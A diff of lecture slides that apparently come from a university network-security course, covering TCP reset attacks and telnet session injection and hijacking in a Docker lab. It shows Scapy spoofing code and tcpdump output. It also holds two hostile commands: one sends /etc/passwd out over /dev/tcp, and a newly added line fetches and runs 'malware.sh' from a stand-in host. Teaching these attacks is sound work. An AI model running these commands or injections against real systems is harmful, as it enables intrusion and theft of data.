@@ -514,7 +514,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN
   - Computer A sends a SYN flood packet to server B, spoofing C
   - When B sends a response to C, C sends back an RST packet
     - As it realized that it never initiated the connection with server B
-- Notably, there is no response sent, nor expected, from a RST packet
+- Notably, there is no ACK sent to a RST, nor is one expected
 
 
 
@@ -522,7 +522,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN
 ## TCP Reset Attack
 ![](images/graphs/tcp_reset_attack.webp)
 - Any party can send a RST packet to break an existing TCP connection
-- Must get four values correct:
+- Must get five values correct:
   - Source & destination IP
   - Source & destination port
   - Sequence number
@@ -536,10 +536,11 @@ tcp6       0      0 :::22                   :::*                    LISTEN
 - Sequence numbers are not actually sequential
 - Instead, they add the length of the data of the last packet to the sequence number
   - So large packets increase the sequence number by a lot more than small packets
+  - This range forms a "window"
 - Hitting enter on a telnet session sends two bytes
   - The enter byte (`\n`) and a control byte
 - `tcpdump` normally shows the *relative* sequence numbers
-- To make `tcpdump` show the absolute sequence numbers, add the `--absolute-tcp-sequence-numbers` flag
+  - To make `tcpdump` show the absolute sequence numbers, add the flag: `--absolute-tcp-sequence-numbers`
 
 
 
@@ -561,7 +562,7 @@ pkt = ip/tcp
 ls(pkt)
 send(pkt,verbose=0)
 ```
-- Note that due to how Docker simulates networks, the attack only works only from *outer1*, and not from, say, *outer2*
+- Note that due to how Docker simulates networks, the attack may only work only from *outer1*, and not from, say, *outer2*
 
 
 
@@ -570,7 +571,8 @@ send(pkt,verbose=0)
 ```
 root@outer1:/# tcpdump -i eth1 --absolute-tcp-sequence-numbers port telnet
 
-15:24:24.290756 IP outer1.47658 > metasploit.telnet: Flags [P.], seq 2304951623:2304951625, ack 1773068003, win 501, options [nop,nop,TS val 593972636 ecr 48654356], length 2
+15:24:24.290756 IP outer1.47658 > metasploit.telnet: Flags [P.], seq 2304951623:2304951625, 
+    ack 1773068003, win 501, options [nop,nop,TS val 593972636 ecr 48654356], length 2
 15:24:24.291824 IP metasploit.telnet > outer1.47658: Flags [P.], seq 1773068003:1773068005, ack 2304951625, win 509, options [nop,nop,TS val 48662585 ecr 593972636], length 2
 15:24:24.291861 IP outer1.47658 > metasploit.telnet: Flags [.], ack 1773068005, win 501, options [nop,nop,TS val 593972638 ecr 48662585], length 0
 15:24:24.294358 IP metasploit.telnet > outer1.47658: Flags [P.], seq 1773068005:1773068028, ack 2304951625, win 509, options [nop,nop,TS val 48662587 ecr 593972638], length 23
@@ -587,7 +589,6 @@ root@outer1:/# mnt/tcp_reset.py 47658 2304951625
 
 See the [pcap](pcaps/tcp_reset.pcap); the telnet session:
 ```
-msfadmin@metasploit:~$ 
 msfadmin@metasploit:~$ 
 msfadmin@metasploit:~$ Connection closed by foreign host.
 root@outer1:/# 
@@ -629,11 +630,12 @@ options    : TCPOptionsField                     = []              ("b''")
 
 <h2 class="r-fit-text">Reset Attack Success and Failure</h2>
 
-- Will not work if the TCP packet is encrypted at the network layer (IPsec)
+- Will not really work if the TCP packet is encrypted at the network layer (via, say, IPsec)
+  - Not feasible to get the sequence number or client port
 - Will work via ssh, since that uses TLS to encrypt (transport layer)
 - Video streaming: it's complicated
   - We have to get the sequence number before the next packet arrives
-  - It won't wait for us like the telnet session did
+  - The next packet won't wait for us like the telnet session did
 
 
 
@@ -685,7 +687,7 @@ sniff(filter='tcp and src host ...', prn=spoof_tcp)
 
 <img src="http://www.cs.virginia.edu/~asb2t/duimg/n06/image21.png">
 
-- Packets can arrive out of order, and TCP reassembles them as needed
+- Packets can arrive out of order, and TCP reassembles them in order
 - The next packet would be at $x+1$; we send a spoofed packet putting the data at $x+\delta$
 - Once the rest of the packet data arrives, the sender's data, plus our malicious data, is passed to the program
 
@@ -693,7 +695,7 @@ sniff(filter='tcp and src host ...', prn=spoof_tcp)
 
 <h2 class="r-fit-text">Redirecting output to the network</h2>
 
-- We can write output to `/dev/tcp/<ip>/<port>`, and it will be sent, via TCP, to that host and port.
+- We can write output to `/dev/tcp/(ip)/(port)`, and it will be sent, via TCP, to that host and port.
 - On outer1, run `nc -lnv 4760`.  On outer2:
 
 <pre class="code-wrapper wide-pre" style="margin-left:-50px;width:110%;"><code class="hljs language-elixir" data-highlighted="yes"
@@ -719,15 +721,16 @@ root@outer1:/#
 
 
 ## Preparing the attack
-- *metasploit* is to old a Linux version to allow writing to `/dev/tcp/<ip>/<port>`
+- *metasploit* is to old a Linux version to allow writing to `/dev/tcp/(ip)/(port)`
 - Actual session hijacking would require a very fast response, and Python is too slow
 - So we'll settle for injection instead
 - And we'll use `nc` to pretend to be a telnet server
-- Once we start telnet, we hit Enter twice to see the packet seq/ack progression
+- Once we start telnet, we hit Enter twice to see the packet SEQ/ACK progression
 
 
 
 ## The code
+- This injects "hello world" in a telnet session from outer1 to outer3
 ```python
 import sys
 from scapy.all import *
@@ -740,7 +743,6 @@ pkt = ip/tcp/data
 ls(pkt)
 send(pkt,verbose=0)
 ```
-- This injects "hello world" in a telnet session from outer1 to outer3
 - In `nc`, it will just display; in `telnet` it would execute a command such as:
 ```
 cat /etc/passwd > /dev/tcp/192.168.100.101/4760
@@ -762,7 +764,8 @@ cat /etc/passwd > /dev/tcp/192.168.100.101/4760
 root@outer1:/mnt# ./tcp_session_hijack.py 44214 2870849844 1750764355
 <output omitted>
 
-19:30:14.946774 IP outer1.44214 > outer3.telnet: Flags [.], seq 2870849844:2870849857, ack 1750764355, win 8192, length 13
+19:30:14.946774 IP outer1.44214 > outer3.telnet: Flags [.], seq 2870849844:2870849857, 
+    ack 1750764355, win 8192, length 13
 19:30:14.946799 IP outer3.telnet > outer1.44214: Flags [.], ack 2870849857, win 509, options [nop,nop,TS val 1367544046 ecr 3447992502], length 0
 ```
 On outer3:
@@ -813,8 +816,8 @@ load       : StrField                            = b'\nhello world\n' ("b''")
 
 ## Hijacking instead of injection
 - In actual telnet, the connection would freeze, as the acknowledgement numbers are now wrong
-  - The server sends an ACK to $x+8$ (or however far forward)
-  - But the client never sent $x+8$ (the attacker did), so ignores it
+  - The server sends an ACK to $x+\delta$ (however far forward)
+  - But the client never sent $x+\delta$ (the attacker did), so ignores it
     - And ignores all future packets
   - Because the client never acknowledges the packet, the server thinks it is lost
     - And retransmits it, to the same effect
@@ -827,11 +830,16 @@ load       : StrField                            = b'\nhello world\n' ("b''")
 
 
 
+<!-- .slide: class="small-pre" -->
 ## Better injection / hijacking
 - Rather than cat'ing output to the /dev device...
 - Let's use a remote (or reverse) shell
   - Your ping shell from HW P2 would work
-- Have one command download the program and also run it
+- Have a single command download the program and also run it:
+```
+wget -q -O /usr/bin/pwn.sh http://sketchyserver.com/malware.sh && \
+      /bin/bash /usr/bin/pwn.sh
+```
 
 
 
